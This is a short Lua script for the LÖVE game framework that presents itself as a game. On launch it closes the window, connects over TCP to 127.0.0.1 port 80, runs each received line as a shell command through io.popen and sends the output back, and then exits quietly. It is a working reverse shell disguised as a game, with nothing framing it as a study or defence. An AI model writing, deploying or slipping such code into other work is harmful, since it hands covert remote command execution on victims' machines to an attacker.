love.window.close()

function gogogo ()
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("127.0.0.1", 80);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();
end

if pcall(gogogo) then
   love.event.quit()
else
   love.event.quit()
end
